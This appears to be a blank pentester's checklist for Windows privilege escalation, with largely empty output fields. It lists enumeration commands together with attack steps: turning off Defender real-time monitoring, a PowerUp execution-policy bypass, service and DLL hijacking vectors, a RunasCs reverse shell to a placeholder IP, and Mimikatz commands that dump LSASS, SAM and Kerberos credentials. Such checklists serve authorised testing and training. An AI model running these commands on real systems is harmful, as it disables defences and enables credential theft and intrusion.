Template Version: 2025.11.08
### System Information:
##### General Info:
- Commands: `systeminfo`; `cmd /c ver`
- Version mapper: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions
###### Terminal output:
```

```
###### Findings:


##### Hotfix:
- Commands:
	- `wmic qfe`
	- `Get-HotFix`
	- `Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update" }`
- MSRC: https://msrc.microsoft.com/update-guide
###### Terminal output:
```

```
###### Findings:


##### Windows Exploit Suggester:
- GitHub: https://github.com/bitsadmin/wesng
- Ref: https://github.com/SecWiki/windows-kernel-exploits
- Command: `pyvenvstart`; `wes systeminfo.txt [-i "Elevation of Privilege"]`;
###### Terminal output:
```

```
###### Findings:


---
### Host/Network Configuration:
**IP, Interface, DNS:** `ipconfig /all`
```

```
**ARP Table:** `arp -a`

**Routing Table:** `route print`

**Hosts File:** `C:\Windows\System32\Drivers\etc\hosts`
```

```

---
### System Environment:
- `reg query "hklm\system\currentcontrolset\control\session manager\environment"`

---
### Sensitive Files:
- [ ] `unattend.xml`
- [ ] `sysprep.inf`
- [ ] `sysprep.xml`

---
### Common Exploits:
- [ ] Potato
- [ ] PrintNightmare

---
### AV/EDR Configuration:
###### Windows Defender Status:
- Check: `Get-MpComputerStatus`
- Disable: `Set-MpPreference -DisableRealtimeMonitoring $True`

###### AppLocker Rules:
- `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`
- `Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path <path> -User Everyone`

---
### User Information:
###### Commands:
- Check: `net user [/dom]`; `net user [<user>] [/dom]`; `Get-LocalUser`
- Logged in: `query user`
- Lockout policy: `net accounts` (Lockout threshold, duration, observation window)

---
### Group Information
###### Commands:
- Local groups: `net localgroup`; `net localgroup <group>`; `Get-LocalGroup`; `Get-LocalGroupMember <group>`
- AD groups: `net group [/dom]`; `net group <group> [/dom]`

---
### Program Files:
**`C:\Program Files\`:**

**`C:\Program Files (x86)\`:**

---
### Installed Applications:
###### Commands:
- `wmic product get name`; `Get-WmiObject -Class Win32_Product`
- `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayName`
- `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayName`

---
### Running Processes
- Command: `tasklist [/svc]`; `tasklist /V`; `Get-Process`
- Focus: `PATH`, credentials

---
### Running Services:
###### Commands:
- **PowerShell:** `Get-CimInstance -ClassName win32_service | Select Name,StartName,PathName,State, StartMode | Where-Object {$_.State -like 'Running'}`
- **CMD:** `wmic service [where "state='running'"] get name,pathname,startname[,state] | findstr /I <service>`
- **CMD:** `sc query <service>`
- **WinRM:** `services`
- **Unquoted paths:** `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """`
- **PowerUp:** `powershell -ep bypass; . .\PowerUp.ps1; Get-ModifiableServiceFile; Get-UnquotedService`; `Get-ModifiableService`
	- https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc (USE WITH CAUTION)
- **Start/Stop:** `Start-Service <service>`; `Stop-Service <service>`; `net start <service>`; `net stop <service>`
- **Reboot:** `shutdown /r /t 0`
###### ProcMon:
1. Install and set up filter ("Process Name" is "target" => include)
2. `sc create <service> binPath="<path/to/service.exe>" start=demand`
3. `sc start <service>`
###### Attack Vectors:
- Binary Hijack
- DLL Hijacking (overwrite permission; missing DLL; search order hijack)
- Unquoted Service Path
###### Checked User:
- [ ] 


---
### Scheduled Tasks:
###### Commands:
- **CMD:** `schtasks /query /fo <LIST | TABLE | CSV> /v`
- **PowerShell:** `Get-ScheduledTask | Format-List`
- **PowerUp:** `powershell -ep bypass;` `. .\PowerUp.ps1`; `Get-ModifiableScheduledTaskFile`
- **PowerShell Filter:** All non-default scheduled tasks not running as current user
```powershell
Get-ScheduledTask | Where-Object { $_.Principal.UserId -ne "<current_user>" -and $_.State -eq "Ready" -and $_.TaskPath -notlike "*\Microsoft\Windows*" } | Select-Object TaskName, @{Name='RunAsUser';Expression={$_.Principal.UserId}}, @{Name='Command';Expression={ ($_.Actions | ForEach-Object { $_.Execute + ' ' + ($_.Arguments -join ' ') }) -join ', ' }} | Format-List
```
- **Important columns:** `TaskName`; `Next Run Time`; `Author`; `Task To Run`
###### Checked User:
- [ ] 

---
### Local Listening Ports:
- `netstat -ano | findstr /C:LISTENING | findstr /C:TCP`

---
### Database Enumeration:
- `sqlcmd -S <server>\<instance> -U <user> -P <pwd> -d <DB> -Q "<query>"`
##### Version Check:
MySQL UDF Abuse: https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html#windows
##### Users:
- [ ] 
##### DB:

---
### Web Directory:

---
### Unattend Directory (`C:\Windows\panther\`):

---
### `C:\Users\` Directory:

---
### Root Directory (`C:\`):

---
### Log Files:

---
### Other Drives:
- `wmic logicaldisk get name`

---
### Recycle Bin:
###### Command:
- `dir C:\$Recycle.Bin /a /s`
###### Checked User:
- [ ] 


---
### Password Spray:
- Interactive: `runas /user:<user> cmd`
- RunasCs.exe: `.\RunasCs.exe <user> <pass> cmd.exe -r <IP>:<PORT>`
	- GitHub: https://github.com/antonioCoco/RunasCs

---
### Hash Dump:
Ref: https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file#mimikatz
**Mimikatz:**
`privilege::debug`
`token::elevate`

**LSASS:** `sekurlsa::logonpasswords`
**Kerberos tickets:** `sekurlsa::tickets`
**Terminal services:** `sekurlsa::tspkg`
**Master keys:** `sekurlsa::dpapi`
**SAM:** `lsadump::sam`
**SECRETS:** `lsadump::secrets`
**Vault:** `vault::list`
**SSP:** `misc::memssp` (plaintext logged in `C:\windows\system32\mimilsa.log`)

#### Dump:

---
### User Enumeration:

---
